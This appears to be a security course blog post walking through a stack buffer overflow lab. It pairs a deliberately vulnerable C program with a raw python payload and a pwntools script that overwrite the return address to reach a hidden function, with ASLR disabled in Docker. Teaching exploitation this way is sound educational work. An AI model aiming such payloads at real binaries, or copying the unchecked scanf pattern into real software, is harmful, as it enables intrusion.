---
layout: post
title: Stack Smash Branching
category: system_security
author: 'reo'
tags: python seclab docker c
mathjax: 
---

The goal of this exercise will be to introduce a series of attacks where the vulnerability
is a seemingly innocuous buffer overflow. This Introductory exercise will allow us to branch
to an unintended location of the program.

## Contents
{:.no_toc}

* Content
{:toc}

<br>

***

## Setup

***

To not compromise the security of our machine, we do the attack within
a docker container. For the purposes of this attack, we disable ASLR and `dmesg`
restrictions within the docker container. The flags we
use are

- `-v` to specify a directory which will be shared with the container
- `--privileged` so the container can alter `randomize_va_space`

```
$ docker run -v $(pwd):/shared --privileged -it thierrysans/vulnerable:stack-smashing-branching bash
# echo 0 > /proc/sys/kernel/randomize_va_space
# echo 0 > /proc/sys/kernel/dmesg_restrict
```

Suppose the target is the C program

```c
#include <stdio.h>

void secretFunction(){
    printf("You have entered the secret function!\n");
}

void echo(){
    char buffer[20];
    printf("Enter some text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);
}

int main(int argc, char **argv){
    echo();
    return 0;
}
```

compiled for a 32-bit architecture, no stack protection.

```
# gcc /shared/vuln.c -o /shared/vuln -fno-stack-protector -m32
```

Our goal
is to manipulate the flow of the program
to execute the code within `secretFunction()`.

<br>

***

## Observations

***

We notice that `echo()` is vulnerable to a buffer overflow. To
see precisely the space allocated by the compiler, we can decompile.

```
/shared# objdump -d -M intel vuln > dump.dmp
```

Looking into the calls in `<echo>` we notice

```
 80484bd:	8d 45 e4             	lea    eax,[ebp-0x1c]
```

So the buffer is `0x1c` or 28 bytes before the base pointer `ebp`.
We can see this overflow in action by sending more bytes than the
reserved 28, say 36 bytes filling the first 28 with `'a'`.

```
/shared# ./vuln
Enter some text:
aaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghi
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghi
Segmentation fault (core dumped)
```

As expected, we get a segmentation fault. Checking the kernel debug message
we see

```
/shared# dmesg | grep "vuln" | tail -n 1
[ 8695.782039] vuln[3654]: segfault at 69686766 ip 0000000069686766 sp 00000000ffffd7b0 error 14
```

of special note here is where the segfault occured, `66, 67, 68, 69` are the
hex for `f,g,h,i` respectively (when decoded from ascii).

<br>

***

## Manipulating the Return Address

***

If we send the address
of the target function `0804848b` instead of these ascii characters, we can get
the program to jump to the desired location. This can be done with a short
python script

```python
import sys
payload = b'a'*32 + b'\x8b\x84\x04\x08'
sys.stdout.buffer.write(payload)
```

running now

```
/shared# python3 python3 payload.py | vuln
Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You have entered the secret function!
Segmentation fault (core dumped)
```

we accessed the secret function as expected.

<br>

***

## Abstracting the Approach

***

Our attack can be improved if we use pwntools instead
of the more manual approach we have done until now.

```python
from pwn import *
pwnlib.term.term_mode= False
```

We use [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format)
to look up the address of the secret function.
```python
def run(path_to_vuln_prgm):
    e = ELF(path_to_vuln_prgm)
    addr = p32(e.symbols['secretFunction'])
```

we next send 512 bytes looking for precisely where the overflow occurs.
We use [cyclic](https://docs.pwntools.com/en/stable/util/cyclic.html)
for that purpose.

```python
    payload = cyclic(512)
    p = process(path_to_vuln_prgm)
    p.sendline(payload)
    p.wait_for_close()
    dbg_info = process('dmesg | grep "vuln" | tail -n 1', stdout=subprocess.PIPE,
            shell=True).recvall()
    eip = int(re.search(b'at\ (.*)\ ip', dbg_info).group(1), 16)
    overflow_len = cyclic_find(p32(eip))
```

knowing both the address and the size of the buffer we send the appropraite payload
for our attack

```python
    payload = b'a'*(overflow_len) + addr
    # this is a special way to print bytes string with non utf-8 characters
    p = process(path_to_vuln_prgm)
    p.sendline(payload)
    p.wait_for_close()
    print(payload)
    sys.stdout.buffer.write(p.recvall())
```

which prints the secret function message as expected.

<br>

***

## Cleanup

***

Finally, don't forget to check that the protections are enabled for your own
machine

```
$ echo 2 > /proc/sys/kernel/randomize_va_space
$ echo 1 > /proc/sys/kernel/dmesg_restrict
```

also don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.

{% include lab_credits.md %}

This post was inspired by [another cool blog post](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/).
